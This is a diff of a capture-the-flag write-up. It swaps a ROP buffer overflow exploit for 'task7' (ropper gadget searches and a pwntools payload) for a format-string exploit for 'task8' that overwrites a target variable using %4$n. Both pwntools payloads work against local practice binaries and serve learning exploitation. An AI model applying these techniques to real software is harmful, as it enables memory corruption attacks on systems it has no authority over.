@@ -17,25 +17,18 @@ to find it's address, we can use objdump.
 we can see that the address is : 0x0804c034
 ## Finding Offset
 the format string vulnerability allows us to write into memory using the format specifier %n.
-So we have to write the address of target_variable and use %n to
-## Gadgets
-using ropper, we can find the wanted gadgets : 
-- ropper --file task7 --search "pop rdi" #0x0000000000401323
-- ropper --file task7 --search "pop ret" #0x0000000000401321
+So we have to write the address of target_variable and use %n to change it's value, the problem is finding the location of target_value in the stack.
+let's try giving AAAA%x %x %x %x %x %x %x %x as input to find the right offset.
+![offset](offset.PNG)
+the address is the 4th address in the stack, to reference directly the address, we can use %4$x
+Now it's simple, we just write the address of the target_variable + %4$n
 ## Payload
 ```python
 from pwn import *
-p = process("./task7")                                                                                                  
-poprdi = 0x401323                                                                                                       
-poprsi = 0x401321                                                                                                       
-print_flag = 0x40121f                                                                                                   
-payload = b""                                                                                                           
-payload += b"A"*72                                                                                                      
-payload += p64(poprdi)                                                                                                  
-payload += p64(0xdeadbeef)                                                                                              
-payload += p64(poprsi)                                                                                                  
-payload += p64(0xc0febabe)                                                                                              
-payload += p64(0)                                                                                                       
-payload += p64(print_flag)                                                                                             
-p.sendline(payload)                                                                                                     
+p = process("./task8")
+target_variable = 0x0804c034
+payload = b""
+payload += p32(target_variable)
+payload += b"%4$n"
+p.sendline(payload)
 p.interactive()
